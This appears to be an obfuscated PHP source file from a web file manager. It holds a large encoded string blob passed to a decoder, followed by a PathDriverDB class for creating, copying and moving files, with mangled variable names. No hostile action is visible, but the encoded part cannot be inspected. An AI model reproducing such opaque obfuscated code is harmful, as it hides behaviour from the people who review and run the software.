\xbf\x24\xc6\x89\x16\x19\xbb\xee\xde\xd1\x7b\x37\xbf\x7e\xf1\xe5\xfb\x77\xec\x90\xe0\x6d\x6c\x7\x97\x95\x96".strrev('[Æï´ÙnŒf†^sû1¸™¨]Ç)Lâ»î’ïwç¸Ğ'."\n".'Ëkâï°_7F›ŒızÏ³ÑÉš')."\335\205\250\77\376\12\205\306\266\236\263\167\367\235\256\102\121\63\121\112\145\232\45\177\351\143\33\317\31\335\176\5\377\310\336\135\233\250\21\271\253\10\267\174\343\360\264\376\162\370\4\303".strrev('Ã•`-^vıwØnÛc§åº1Û.&as¶ß};®ûÙÇtng“Ğö öÛ}ä,ì×m/·Sê')."\214\26\127\160\333\372\375\167\236\65\166\351\235\34\20\57\373\264\42\140\10\106\121\30\154\60\117\76\270\357\276\13\366\355\276\12\43\311\206\365\373\326\337\75\172\325\255\243\127\257\343\237"."\35\335\265\113\214\162\314\117\136\12\253\100\160\27\341\164\40\271\175\302\322\272\120\222\36\253\223\211\34\26\274\370\3\143\130\3\105\237\116\140\362\24\171\345\0\236\331\151\142\213\26\215"."\143\276\331\114\303\330\257\256\102\344\263\252\261\352\304\32\364\133\133\345\251\302\273\13\22\307\4\24\47\220\166\124\65\236\130\103\2\265\340\33\151\25\360\16\311\75\262\130\170\240\227\235"."\217\250\207\164\156\71\237\260\42\314\350\246\370\247\370\31\363\233\277\22\177\121\74\216\325\311\171\216\170\175\200\162\37\372\252\11\73\334\214\352\366\220\131\224\155\225\247\260\333\134\31\211"."\167\344\54\340\2\324\241\277\120\152\1\352\121\123\302\55\233\312\221\16\12\364\122\153\140\7\370\135\267\217\236\365\213\327\57\335\346\206\245\132\23\166\235\5\211\150\145\257\53\322\133\26"."\xa3\x17\x5c\x56\xfe\x3d\x2\xef\xfc\x1a\x3\x1e\x3d\xfd\xaa\x7d\x17\xbb\x20\x99\xfd\xac\x22\xa9\xc7\x44\x1\x82\xfd\x2e\x3a\xc2\x79\x83\x5c\x84\xe2\xfb\xff\x66\x15\x51\x65\x65\x23\x56\xdb\xd3\x84\xa5\xde\xce".base64_decode('wkgp78XqK29Cdp/peiCo3gmPFVBOeFlmSAnemxNB+nBRoyI/KyZ5ASfKTcrcmEUTpGFxgg==')."\45\11\321\242\117\334\51\301\22\202\352\224\20\116\166\265\27\133\244\170\221\230\217\327\30\132\270\266\41\275\205\40\203\70\337\251\162\277\136\345\36\5\122\4\153\103\275\362\313\131\303\150".base64_decode('H4az8XsoXqxb9Rrp8XIE4ajY1BS8P1AJpLNkpN2fJJY33lKJfbBipfIukQGQToR5ffKTGg==').base64_decode('WJnm5UeE7hc7xM5aK39tZFkurUyZ2jh9diO7v3wSMxwqFZiJPwqy10gm+vsYrRHvTrG+4Q==')."\x9\x97\x9e\x6f\x71\x24\x8b\x61\xe4\xf\x4a\x30\x22\xe5\x80\x13\xad\x75\xbc\x9a\x6\x1d\xa5\x8a\x1d\xe9\xbd\x19\x72\xb0\x43\x49\x14\x36\xa7\x53\xf9\xbb\x3c\x15\xa8\x35\xda\xa2\x33\xb9\xb\xa4\x50\xe9\x8e\x1c".base64_decode('n5B+FihyeE0skd7sgOgJoS+A4QOooabYNRF5VaIMqUwpP9AkZSq2aSo5LT8Cm9FJVuMkaw==')."\xe\xfe\x50\x13\xbe\xc7\x61\x4d\x62\x4f\x30\x9\x1f\xd2\x98\x57\x9\x27\xa1\xd4\xc5\x15\xe4\xd0\x63\x2c\x1f\x7e\x4a\xcd\x87\x19\x61\xbc\x24\x5f\x33\x44\x1c\xcf\x65\x3d\x21\xbf\x4b\xdb\x41\x38\x1\xf0\x46\xfa"."\xd6\x15\x64\x44\x3a\x17\x84\xa3\x92\x61\xa0\x94\xa0\x6\x5b\xa2\x6a\xa0\xa3\xa3\x62\x6\x4c\x16\xd5\x3f\x63\xab\x1a\xdf\xa\xe9\xb9\x4d\x1a\x9a\x8b\x36\x6d\x4a\xa\xdf\x1d\x6a\xaa\xc2\xa9\x55\x8a\x55\x4c\x31".strrev('bG'."\n".'¶¤‡àÙg.ÂØıÙLÿŸI@o×7®Í’ò}CéD\\j‘@kšvB'."\0".'#3°~UÛg')."\x8a\x32\x57\x53\xe8\x88\x36\x55\x93\xd3\x94\x6a\x25\x83\xb8\x3f\x37\x2f\x9e\xe7\x2e\xcc\x9f\x47\x9b\xeb\xd7\xe4\x4c\xbc\xc6\xe2\x26\xdb\x59\xf2\xdd\xfc\x20\xf7\x9b\x59\xf1\x20\x2d\x20\x79\xe0\x27\x2f\x19\x5".base64_decode('tfzi8iK4cl9Kzuqi98Z65OkjN7bKS/uJ3sgv1BgqfUa08jEkP32rgBjYVAahPrNR0FIDGA==').base64_decode('+QSngGZARgdWStAMx5sjtmTzVMIXF8lZTlG8zLZ6Na0Iv0Wzdm15GlhRu7MCBcOdhDHInQ==')."\206\225\103\42\15\261\74\347\147\50\366\312\100\42\205\301\320\137\121\46\22\135\40\42\164\211\71\62\273\230\375\23\211\165\167\125\373\352\326\256\365\33\314\326\220\131\64\261\262\76\16\115"."\343\335\76\47\74\352\11\14\75\7\204\4\67\44\25\147\117\201\105\170\250\277\116\134\266\344\66\205\12\66\64\154\152\232\327\305\245\254\36\226\247\22\235\212\74\167\114\112\65\32\146\61"."\xa4\x40\xdb\xc8\xe4\x12\x1e\xc\x46\x85\x1c\xce\xd7\x5\xa5\x34\x3e\xa2\xdd\xb\x38\xdd\x79\xcf\x17\x8f\xd7\xd1\x71\x96\xc3\x81\x42\xc1\x41\x52\x58\x4\x1f\x6c\x65\x8d\x5e\x3f\xa7\x3\xf4\xb0\xcb\x97\x12\xb7"."\x19\x19\x8\xa1\x42\xae\x74\x6c\x22\xe8\xca\xc0\xd7\xad\x49\xf2\x20\xa2\xa4\x66\x91\xd3\x2d\x9e\x8e\xea\xe2\x89\x80\xe6\x98\xb6\x48\xa4\x84\x67\xcf\xb5\x52\x45\xa3\x60\x3b\xe8\x1a\x7d\x8b\xb9\x8a\x3c\x81\xb6"."\102\33\324\50\110\225\2\232\273\246\52\362\202\105\25\242\143\64\207\21\63\336\300\271\370\153\110\64\316\66\125\221\116\130\31\135\107\345\11\255\252\364\21\124\260\112\141\324\64\247\361\161"."\x2c\xda\x26\xe2\xa5\xfc\xde\x1c\x3c\x2b\xd9\x19\x87\x2b\x49\x81\x28\x1c\x31\x9e\x70\x1a\xfd\x3d\xf1\x4\xce\x38\xf0\x9b\x97\x59\x24\x33\x93\xb\x17\x84\x6e\x11\xc1\xbc\xf\x6b\x64\x29\x10\x3c\x6f\xd9\x11\x8f"."\x25\x63\x41\xf6\x7a\x9c\x53\x75\x4b\xd3\xa6\xb1\x4d\x86\x45\xef\x85\x8a\x7d\x19\xbb\x2f\xc7\x2d\x8a\x18\x4\x97\x2e\xfc\x90\x2\xd8\x50\x2c\xe5\xf3\xdc\xc4\x13\xe3\x2b\x67\x81\x4d\x95\xff\x74\x91\x53\x50\x3d".base64_decode('3TNOvtKlsTNSoK700DeRKdmCC+MnMpL4jrsFyZKfUezlVE/7uqivgKZ6dmmKGZSKu5IMUg==')."\316\121\60\153\350\221\331\265\37\310\247\130\131\325\370\130\17\236\165\252\366\124\327\370\352\152\253\313\163\250\351\256\63\37\133\300\251\247\44\120\46\74\242\4\54\236\334\112\14\106\302\241"."\x68\x52\xd\x3\x77\x6f\x98\x32\xd3\x57\x2f\x6e\xc\x1a\x96\xf0\x19\x4c\xc3\x41\x6e\x7a\x54\xd4\xc9\xa8\xfa\x1c\xdd\xaa\x30\x34\xf4\x5c\x25\xc9\xd\x4f\xf5\xbc\x43\x1b\x4b\x87\x34\x6b\x32\x8f\xb2\x53\xea\xeb"."\353\275\365\15\350\177\166\223\202\271\2\151\144\316\176\44\220\372\372\106\362\77\315\40\57\244\1\12\72\163\20\111\144\264\34\0\206\164\35\32\4\274\23\355\224\113\114\36\355\12\342\213".base64_decode('ngpuGkyLMJxF2EccvTKy6niAUyFn/BDT3YPAjScAn9npAPXezVglakg/GRRoL783jMDEqg==').base64_decode('mUOvbDfxRoXy6S75Yz42uDRReK73sgyv/GwMFKKETpwLOpqGyjg9yOIUJNmkeD9xgqSpxQ==')."\x32\xae\xe4\x15\x17\x47\xe5\xe3\x3f\x92\xcd\x2f\xdf\x92\x58\x96\x7b\x26\xc1\xd1\x28\xaf\x89\xbe\x4e\x44\xfd\x5e\xc0\x18\x56\x58\x85\x19\x73\x48\x15\xb2\x9\x8e\x9e\xc2\x63\x64\x48\xf1\x6e\x93\xa1\x61\x5a\xba".strrev('…›k2¨š7ğ'."\n".'ıŠâK:I=dvÇ•*€%Ã¬Œ.Î"X0	©œ	$ñ•Ç ')."\106\211\37\173\372\354\57\321\337\64\36\132\66\271\266\173\142\311\34\71\16\66\334\226\201\54\46\315\24\73\353\112\174\216\361\36\113\11\261\4\172\112\27\344\356\143\245\12\334\131\256\62".base64_decode('AXpEVlYA0suhyUliBWic7oImjmKD3B+27D2Wqp4kIzELnu4QFjqsjkFpI+orFM1+NOuWPA==')._kodDe('KB5embMoaCX9on269iVRv7nuf4jCHbPeBPIiXgPEXxsSesYB5ggkoZPAT+j+yp062qeyY4s=').base64_decode('ssiuwlkH3jE7U3jLPgPpmKbDhsfmZVNlCiYoEtZCye9Fqg40YbjKTMDwCAljC2c6TaO6CA==')."\xc7\x41\x70\x92\x10\xba\xac\x9e\x84\xe6\x0\x29\x24\x8b\xa\x57\x10\x61\xcf\x21\x27\x1c\xce\xd6\x1\x4d\x1b\x99\x2c\x22\x17\x73\xe6\xbd\x7a\xf6\x5\x2c\x70\x11\x83\xc2\xc3\xca\x5f\xee\x94\x8f\xdc\xf0\x90\xaa".base64_decode('spoIr+g2/rx6BUR0IlsZVhG+jSto5KRQiuHa2Wkn2iVbVOnpwckKfaZbwY+PT3TOT3kBeA==').base64_decode('0MxE0iP2RS0XwnV1ukjUQgdF5G2lohszX1Um+aaAae0k9qgJpcfCksIP3e5C3epBWx3BTQ==')."\140\102\272\50\65\146\165\342\46\103\50\315\346\107\161\162\127\211\127\50\162\105\210\353\46\63\130\303\323\243\220\146\316\41\117\142\124\310\305\36\65\330\327\270\137\156\240\374\10\306\264\371".base64_decode('9hhXH0hL7DMiy7dJWsQ7TzTVYUQgvQnAQVEzWOM11jZiDkqeVJB27K6o23gWl5AkGhSVOA==').strrev('“TrQÆ˜³)ê)€A^l/ ·¯+P}¡X«d„£À–p,ÙÙz¿'."\0".'‚‚JtaÅìİc6ûá/')."\267\343\172\277\34\45\366\12\154\65\10\257\355\162\25\330\53\231\104\166\360\52\14\244\354\222\354\343\114\172\330\1\305\244\7\74\44\101\324\333\240\160\11\126\245\65\323\310\144\51\203\300"."\127\22\146\135\12\133\351\6\33\321\114\45\112\275\374\370\331\45\142\262\113\161\212\54\301\261\133\156\270\2\342\334\11\367\300\222\363\120\265\330\241\272\350\231\134\204\174\263\254\10\315\303"."\x42\x94\xb8\xe\x27\xe7\x58\xf8\x65\x8e\x4e\x36\x8b\x95\x72\x2a\x7c\x8a\x64\x49\x23\x9a\x62\x98\x6\xab\x7c\x99\x18\x24\xc8\x18\xd1\x99\xb5\xb6\xb7\x61\x8a\x77\x2a\xec\x60\xe4\x2b\x72\x6c\x73\x6\x7c\x4\x2d"."\54\11\15\360\366\226\221\61\260\165\6\70\1\143\112\207\370\304\235\222\160\34\103\74\104\361\371\44\256\244\170\254\50\311\22\342\141\173\342\153\111\46\353\302\106\211\232\107\143\200\316\112"."\371\164\204\160\166\213\303\240\335\5\200\326\207\63\37\336\350\20\215\241\356\236\114\207\201\241\253\22\170\10\106\176\205\204\224\22\375\20\126\377\50\311\244\57\201\110\3\43\154\255\250\27".strrev('¨DrÓ‘Ë–ÉnÆni3ÈØßğ¶6Ğà%ö-Mo€ú’¨JÆ½¹by4œ‘9­v*')."\x51\xa7\xa3\x34\x4f\xe2\x50\x43\x3a\x73\xb\xc0\x76\xea\x1d\x6d\x1d\x7e\x9e\xd4\xcc\x97\x27\x55\x94\x8\x27\x77\x41\x66\x39\xa9\xf\x33\xa7\xaa\x43\x39\x23\xa5\x44\x62\xb\xc2\xc1\x40\xa4\x25\x9c\x58\xa8\xf4"."\343\203\127\141\131\210\232\253\222\145\253\132\342\265\33\362\274\217\163\201\23\335\61\235\16\206\353\275\374\251\31\34\364\366\242\175\204\67\315\367\132\226\330\125\221\36\102\145\342\101\76\147".base64_decode('tRQr9WJZjXl8ey9bVgZrxCtAZ4X+VwIuFPVy+BEdWzhKLZYKlCq0BuArf4G8DyRDI/FIzw==').base64_decode('j9d4Iz9oWIYgB6zEiFx7oKU9HFUDkUhsicMwWJwFFLkiJS2/1STNjJgE+vVyD4vgz05+Bw==')."\xc3\xa5\x5c\xa1\xd3\x27\xbb\x10\x2d\xb0\x33\x2e\x78\x3c\x96\xbf\xdd\x42\xa3\xd2\x5b\x6a\x85\xa2\x66\x58\xba\x94\x40\x9f\xfd\xaa\x83\xcb\x72\x5a\x36\xeb\x78\x12\x35\xdb\x27\x45\x4b\x4e\x7e\x5b\xf1\x53\x2a\xfd"."\0\113\43\202\356\370\0\361\360\202\266\344\177\335\124\43\55\234\360\31\151\146\171\306\257\104\323\147\135\202\362\363\271\354\233\342\361\240\362\224\377\366\55\72\217\344\375\223\70\61\143\257".strrev('Ù+&Ñfî…¨(`·Øˆâ'."\n".'ˆj'."\r".'Ø'."\r".'COëP|‚‘Å1I|SÂêTÇM=2Ûdš]')."\x87\x29\xe7\x10\x19\x81\x1\x77\x58\x5b\xba\x1e\xd3\x73\xdb\xc7\x3b\x9e\xca\x2b\xfb\x6\x79\xb9\x85\xe6\x91\x93\x29\x4\xd9\x23\xfa\x84\x62\xfc\xa5\x26\x51\xd4\x9d\x53\xa1\x1\x28\x5b\x11\x2a\x2f\xe\xa0\x34"."\51\365\364\135\107\376\12\217\62\227\71\176\20\37\40\56\3\103\271\202\355\330\351\267\311\167\145\244\51\241\11\130\377\123\344\12\74\72\347\54\212\47\266\211\115\246\52\363\116\102\207\305"."\xfe\xf\x1b\x62\x9a\xb9\x91\xb2\x4\x87\x76\x2c\xc2\x7a\xc3\x4d\xa2\xf1\xcb\x45\xf9\x3e\x53\x1e\x75\x42\xcf\xf1\x75\x29\xfa\x5c\x2b\x55\x44\x78\xd0\x7e\x44\xb7\xcb\xdf\x7f\xa3\xc5\xff\x6f\xa\xd2\xcc\x84\xe4"."\323\326\131\111\171\203\54\67\377\24\262\34\176\332\56\143\16\71\337\160\305\51\356\307\354\34\317\330\111\53\214\270\61\220\37\336\163\26\362\224\275\40\245\220\347\267\25\104\214\140\356\261"."\x29\xf\xdb\xe8\x12\x60\xe9\xd3\x93\xe8\x4f\x37\xfc\x32\x6e\xe8\x6e\x4\xa5\x73\xf0\xc9\x5a\x8e\x8a\xc1\x8c\x91\x4d\x17\xb9\x91\x96\x48\x68\xd7\x85\xf6\x81\x94\x42\x84\xa5\xa0\x31\x2f\xfa\xe4\x99\xcb\x16\x46".strrev('(¤úfËDy¬ELUE~µ&i,Txí–BX–'."\0".'fâxŸ:õ‚f“Ä··Î¡Gb/JªÑáÒ').base64_decode('k2kI03y+50kA7J3QtIc8YknpovtVLGl9cvIrlxbukSEva/ZqWbAodFy2K6Itm85YigOMJg==').base64_decode('+bVCQZyPyBwY/eu4Rw15nck2lfgUUakRQ0LgoHRmSRPh/LKUD9NzGkdqUdpMyt6h6dmNuA==')."\x8e\xb\xe0\xa8\x9d\x1d\xf4\xb0\x16\x6\x50\xae\x92\x1d\xa0\x73\xbd\x3b\xa2\x4f\x7c\xcf\xed\x2f\x3f\x70\xc7\xc6\x68\x40\x61\xc8\xb3\xf7\xc2\x26\x85\x38\xf8\x90\x77\x7b\x0\xa0\xcc\x55\x4\xaa\x38\x16\x36\x46"."\x2d\x24\x72\xd3\x67\x43\x9\xe5\x90\x29\xdc\x67\xa4\x4a\x2f\xb8\xc1\xf3\xa4\x95\x1e\x64\xa3\x2b\x81\xfc\xb4\xe8\x7d\x7c\xe7\x84\xe3\x42\x56\x90\xfd\x22\x9\x13\x1d\xf7\xcb\xa1\xe5\xaf\xa0\xb2\x17\x4f\xd9\x52"."\x82\xe7\x4e\x2b\xbc\x61\x3a\xee\x13\xa8\x1e\x71\xf3\xfa\xb3\xde\x79\x13\xf7\x7c\x9d\xaf\xd9\xe3\x7e\x70\x49\x83\x6f\x4e\xca\xf6\x37\xee\xad\xd\x1f\x56\x57\x81\xb8\x7b\x90\x93\x66\xb9\x12\x5a\x98\x24\x38\x1e".strrev('Çd[Ûœl\'ivvA¸B·?f—…hOs^:ÄïŠÈ»0ğÎ±YŠ—~¤iW‘ü®¤'."\r".'z•h')."\330\156\60\303\201\273\210\41\213\313\177\324\347\162\31\303\130\226\113\117\231\72\175\266\254\101\21\123\50\16\167\301\217\12\234\121\203\314\43\220\102\161\242\241\302\34\75\313\253\237\144\72".base64_decode('L9qUP0rs4gj/3YIRmxEKKtnulr/bXjYCBE8lCzKJQbrsgExsmmOJVUdZoniK2PktKk5U6A==')."\x87\xc4\x7\xc5\x62\xa1\xcf\xca\x9a\x59\xbc\x91\xcf\xe1\x3\x2\xbb\xa8\x39\xf7\xa7\x95\xb6\x61\x64\x24\xd8\x9e\xf\xeb\x78\x45\xcc\x69\x29\x5\x2a\x1b\x91\x2d\xed\xd3\xe4\x1a\x6d\xd3\xad\x6f\xc2\xc5\x31\x9f".base64_decode('JLrTWD4LbBy7pRCrTaJE/8UEsi0X3Z0JEzHcfcdO3TkK/pMZmanwhLBkQPMZfaCSH99qeg==')."\x35\xdb\x2b\x21\xa7\xa4\xaf\xd4\xed\x18\x99\x6c\x20\x17\x62\x47\xec\xec\xb7\xab\x7a\x54\x4c\xd4\xd1\xe3\x51\xc6\x3\x2a\x17\xff\xa4\x97\x86\x85\x2b\x44\x49\xf0\xc3\xa5\xd9\xa5\xf2\x71\x14\xa\xe4\x4e\xb3\x53"."\204\222\37\102\45\27\202\205\317\36\262\164\35\313\130\362\253\56\137\250\45\25\311\353\243\274\152\351\131\131\241\206\42\172\53\350\21\54\156\142\121\101\232\31\130\300\257\143\153\222\275\237".base64_decode('UzcGwp70JjoaPunZcFMOS88VI54QY1cqUHMc21oUb3E9KU/ol/udeTZmhGgIeihd83dsnQ==')."\370\113\233\216\255\224\345\176\156\27\211\206\216\27\111\322\145\57\224\3\341\44\227\352\350\327\44\326\53\270\254\10\105\113\71\21\221\64\314\144\377\305\63\35\336\20\260\303\77\27\215\140"."\76\26\54\327\53\334\324\121\70\15\263\155\302\377\372\245\331\377\127\17\314\116\257\147\147\1\216\207\351\27\200\260\16\255\305\7\256\134\367\101\365\320\256\176\70\331\353\4\300\42\64\370".strrev('# wÊö`j"ïŸ»¯¸ŠWFOàä#Ïe7·•ÂbVl´ãÎÆ¤Ì§3–œHTAA¾')."\70\255\122\61\371\15\142\104\130\12\22\115\44\165\241\24\251\26\156\164\10\300\154\243\303\266\143\25\26\4\115\142\122\267\40\156\171\43\65\120\341\124\236\230\337\72\137\10\220\244\234\62"."\x30\xd1\x7c\x24\xc\x31\xb7\x9c\x7e\x16\x4a\xe1\x7d\x28\x71\x41\x3\xd3\x20\xbb\x9\x88\x15\xd8\x8e\xb5\x16\xd8\x49\xcf\xc9\x8c\xec\x11\xd7\x24\x40\xfd\x64\x8a\xe7\x48\x2a\xa3\x93\x49\xc7\xe4\x3a\x12\xe5\x79".base64_decode('E8TMx/DCUaLd9UQyBbLksXUcRJQbaZSX5gRFLoIvBjh1bnhaccO89V5XQoPXVR1/Jdq5aA==')."\34\317\26\123\303\26\264\322\342\130\267\302\164\154\344\54\213\34\152\173\313\313\320\5\222\20\60\343\54\321\312\204\202\67\112\350\31\161\110\36\17\106\160\72\212\46\221\70\235\251\134\337"."\44\31\142\247\44\145\256\133\210\244\311\223\174\145\354\217\321\136\307\114\141\113\100\161\206\232\214\305\103\352\222\60\166\151\21\76\65\324\311\234\61\33\46\171\201\204\125\331\331\136\103\156"."\305\301\2\100\333\241\126\123\240\222\216\250\242\244\131\26\36\205\355\134\41\310\117\174\235\167\253\245\33\30\314\237\227\254\353\164\2\343\153\64\316\265\70\257\22\130\312\54\132\262\73\116"."\107\46\226\337\114\224\33\147\33\362\316\74\132\310\172\312\326\323\12\226\4\34\233\203\256\151\365\123\173\76\253\26\224\317\41\247\175\16\44\354\122\22\123\275\314\150\230\301\124\54\147\122".base64_decode('/zuV8hBuJmwHEonna9zP1rQ6fFs1SrpXhXj5gveLxpmbqBkUMoorD5OG8XPxNpcfa7PXTg==')."\260\101\236\37\73\1\303\267\76\374\4\377\100\145\276\114\315\251\314\76\11\53\27\204\212\210\120\334\362\315\45\174\311\56\216\304\212\361\34\277\354\101\324\102\124\323\343\120\370\200\31\202"."\234\44\35\313\243\135\133\332\371\20\31\311\44\311\314\353\67\324\40\35\54\73\317\365\371\175\331\62\106\132\62\42\122\66\51\305\274\307\242\137\174\365\77\54\134\60\221\154\172\70\26\30"."\324\270\227\63\167\251\116\307\216\130\262\2\110\21\12\21\52\77\350\25\347\317\222\30\312\212\341\55\265\220\20\134\351\22\105\25\74\117\33\24\102\265\330\324\245\323\255\332\140\5\320\264".base64_decode('7vZSh1I4KBHKJZ8d4gaOPiR/HeDEBRkHYHmq8OkhlReHe6KbOK1S9wmFcxaXfYZwpBJJ9A==')."\x41\x27\x6e\x32\x23\x6d\xa0\xb1\x4d\x91\xb0\xa5\xa1\x5d\xe1\x7a\x22\xf1\x49\xa7\x87\x12\xe\xc6\xe7\xc\xc1\x90\x1b\x7c\x5e\x47\xaa\x4b\x25\x80\x55\x72\x4c\xa0\x74\x65\x81\x92\x4a\xaa\xbe\xa2\x2e\x4b\x42\x1"."\75\33\221\252\223\17\376\307\55\220\250\374\21\201\225\316\41\226\134\273\210\14\46\262\230\216\301\227\170\26\357\30\100\306\345\114\107\163\334\123\113\166\260\2\175\151\142\216\234\17\320\274"."\x80\x33\x8b\xc2\xeb\xae\xd6\xcb\x5\xdc\x3d\xa3\x25\x1c\x6f\x10\xca\xe9\x43\x86\x9d\xca\x48\xdb\xed\xf2\xcc\xf2\xf4\x62\xd9\x60\x43\x3\x2a\xf7\xc3\xdd\x5a\x36\xd6\x6e\x25\x84\xa8\xa4\xac\x3d\x92\x55\x51\xd2"."\254\120\206\266\250\142\61\232\205\113\212\135\216\243\354\70\103\200\313\322\54\134\266\54\233\25\56\33\127\122\316\326\112\326\70\335\53\37\74\120\152\245\53\164\130\250\176\44\320\361\306\263".base64_decode('InD55wAT3dBEC1a5FUJ55bLjqNSKisDjtsINLWQOvJWtlOMwhnJylEp0m+VUoNSUCo1rJQ==')."\x25\x2c\x87\xca\x59\x86\xc8\xab\x60\xc7\x44\x3f\x89\xa5\x1f\xd9\x1d\x64\x85\x6c\xd9\x28\xaa\xb2\xd9\x54\xbc\x22\x95\xb1\x9c\xf6\x4c\xae\x74\x79\x80\xc0\x61\x39\x48\xd0\x80\xc0\x48\x4\xcb\x1a\x3\xc2\x5e\x94"."\x5d\x17\x99\xe4\x60\x25\xa5\xfc\x40\xde\xe4\xec\x29\x2d\xcc\x81\xb1\xe4\x14\x28\xba\xc7\xb9\xac\x36\x27\xea\xe7\x4b\x92\xeb\xf8\x8a\xb7\x57\x3c\x58\xc3\x54\xae\xcb\xc9\x6a\xfc\x1a\xa1\x30\xa9\xa3\x7b\x66\xd3"."\x36\x52\xba\xd3\x3f\xbd\xec\x15\x92\xe6\xb3\x8f\x64\x25\x7d\xb6\x4b\x95\x2c\xf4\x5d\xe\xcb\x9a\xa\xa\x56\x92\x4\x12\xb3\x38\xd5\xa1\xf5\x49\xc2\x91\xc0\x9\xc7\xe5\x32\x2a\x92\xc0\x61\x18\x3d\x57\xf\x62"."\x63\xf\x7e\xa2\x4a\x9c\xa4\x53\x16\x4e\xb3\x13\x66\xd1\xf6\xe0\xbc\xa4\x59\x20\xbf\xcd\xa6\x6d\xb\x33\x15\xaa\x60\x22\x62\x36\xe6\xc3\x1e\xc9\xa\xb\x85\xc4\xf1\x29\x6e\x14\x39\x87\x23\x68\x4b\x28\x16\x9".base64_decode('wgk/1twkdJpL6Jwjgs/3eERms3DS31py2SKIhAEz3WsOM1eMCK+kQRIngJpbthRiEaCibA==')."\123\106\134\231\130\176\232\343\207\307\220\274\244\16\170\303\324\267\242\320\357\50\116\137\205\344\26\341\237\125\3\234\2\210\52\350\113\50\104\45\13\227\337\22\311\104\131\126\107\40\221\130".base64_decode('Eou30IdTyrJJKclyryyroy0WHS8v1B4IR8rysJFfVBVOPWlWuIO0khxij9eKcHChaEm5Lw==')."\x55\x76\xe8\x16\x81\x67\x2e\xc5\xbc\x48\x87\x50\x85\x8c\xc9\xce\x96\x18\x7c\x42\xcb\x32\x65\x90\x74\x48\xa1\xe7\x84\xd7\x57\x51\xc6\xa9\xe3\x92\xe7\xdf\x62\xee\x99\x79\xc0\xf9\x5a\xa1\xcb\xe6\x96\x21\x36\x54"."\204\115\366\242\120\167\274\0\251\370\301\31\116\37\270\234\57\354\106\174\16\373\22\51\235\254\41\102\224\44\334\224\371\75\111\250\253\70\100\362\241\105\371\201\32\311\25\3\200\33\166\212".strrev(''."\0".''."\0".'¸ê•ˆaùÿñ-J˜ÑuAfh¯ë[lÃI–d©:òà²îŒÀé^Ì+ V	').strrev('')."".""."", 10, -8))); goto dù„”‰Ï; d‹£‘Í˜ˆÜ: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($¥×©˜—) { $this->pathParse = $¥×©˜—; $this->model = Model($_SERVER[ˆ¡¹µ‹Â][1411]); } public function getPath($É“ªá®ä) { return trim($É“ªá®ä, $_SERVER[ˆ¡¹µ‹Â][8]); } public function pathFather($·¯ï¦æÚ) { $›‡æ¹ºÕ = $this->parse($·¯ï¦æÚ); $›‡æ¹ºÕ = $this->infoSimple($·¯ï¦æÚ); return $›‡æ¹ºÕ ? $›‡æ¹ºÕ[$_SERVER[ˆ¡¹µ‹Â][192]] : !1; } public function pathThis($áš˜Û») { $ªÁÃîç® = $this->infoSimple($áš˜Û»); return $ªÁÃîç® ? $ªÁÃîç®[$_SERVER[ˆ¡¹µ‹Â][32]] : !1; } public function getPathOuter($îµÒúª«) { if (!$îµÒúª«) { return $îµÒúª«; } $ÆİÎ§®Ø = $this->parse($îµÒúª«); return KodIO::make($ÆİÎ§®Ø[$_SERVER[ˆ¡¹µ‹Â][475]]); } public function copyFolderFromIO($«¾İ´²¯, $àºÂ³¯, $ë²¡îİ, $Â–’¹¥, $¥¤æœ¹â) { $ÜÈûŞœô = $this->model->copyFolderFromIO($«¾İ´²¯, $àºÂ³¯, $ë²¡îİ, $Â–’¹¥, $¥¤æœ¹â); return KodIO::make($ÜÈûŞœô); } public function isParentOf($ìÔÜúŸ, $¯µ£¯òä) { return $this->model->isParentOf($ìÔÜúŸ, $¯µ£¯òä); } public function mkfile($Àôêòç, $òöí÷Å = '', $Àöğæ = REPEAT_RENAME) { $ÚËó€½Ü =& $_SERVER[ˆ¡¹µ‹Â]; $†­ïâğ™ = $this->parse($Àôêòç); $Àôêòç = $†­ïâğ™[$ÚËó€½Ü[475]]; for ($óÉÁ·Ù¶ = 0; $óÉÁ·Ù¶ < count($†­ïâğ™[$ÚËó€½Ü[1412]]); $óÉÁ·Ù¶++) { $¸¾ò½Âİ = $†­ïâğ™[$ÚËó€½Ü[1412]][$óÉÁ·Ù¶]; if ($óÉÁ·Ù¶ == count($†­ïâğ™[$ÚËó€½Ü[1412]]) - 1) { $Àôêòç = $this->model->mkfile($Àôêòç, $¸¾ò½Âİ, $òöí÷Å, $Àöğæ); break; } $Àôêòç = $this->model->mkdir($Àôêòç, $¸¾ò½Âİ, REPEAT_SKIP); } return $this->getPathOuter($Àôêòç); } public function mkdir($‚âÖî’, $ø³¬úŒ = REPEAT_SKIP) { $ŸõÅÄºÀ =& $_SERVER[ˆ¡¹µ‹Â]; $´«¬ú™ = $this->parse($‚âÖî’); $‚âÖî’ = $´«¬ú™[$ŸõÅÄºÀ[475]]; for ($‘ÌÎ¸ığ = 0; $‘ÌÎ¸ığ < count($´«¬ú™[$ŸõÅÄºÀ[1412]]); $‘ÌÎ¸ığ++) { $ÙÃùµ° = $´«¬ú™[$ŸõÅÄºÀ[1412]][$‘ÌÎ¸ığ]; $‚âÖî’ = $this->model->mkdir($‚âÖî’, $ÙÃùµ°, $ø³¬úŒ); } return $this->getPathOuter($‚âÖî’); } public function copyFile($ä®µ·¹³, $ú‹Á¶Ì°, $›“¹àğü = REPEAT_REPLACE) { $™†¶œ»— =& $_SERVER[ˆ¡¹µ‹Â]; $ˆ²„Ÿ€ˆ = $this->parse($ú‹Á¶Ì°); $ƒé·±Îå = $this->model->copy($ä®µ·¹³, $ˆ²„Ÿ€ˆ[$™†¶œ»—[475]], $›“¹àğü, $ˆ²„Ÿ€ˆ[$™†¶œ»—[87]]); return $ƒé·±Îå ? $this->getPathOuter($ƒé·±Îå) : !1; } public function moveFile($äŠåòá´, $Å™’Û‰, $İ¬§¡Œ× = REPEAT_REPLACE) { $ªå³Ö =& $_SERVER[ˆ¡¹µ‹Â]; $’ºˆªŒ = $this->parse($Å™’Û‰); $’Ô ®ò = $this->model->move($äŠåòá´, $’ºˆªŒ[$ªå³Ö[475]], $İ¬§¡Œ×, $’ºˆªŒ[$ªå³Ö[87]]); return $’Ô ®ò ? $this->getPathOuter($’Ô ®ò) : !1; } public function copy($®ŒÓ†£Œ, $Œ¨Ïö–ö, $ïå”áˆË = REPEAT_REPLACE, $„‡ÇİµÁ = false) { $óÇö—¥ˆ = $this->parse($Œ¨Ïö–ö); $¹ô–ÊèÈ = $this->model->copy($®ŒÓ†£Œ, $óÇö—¥ˆ[$_SERVER[ˆ¡¹µ‹Â][475]], 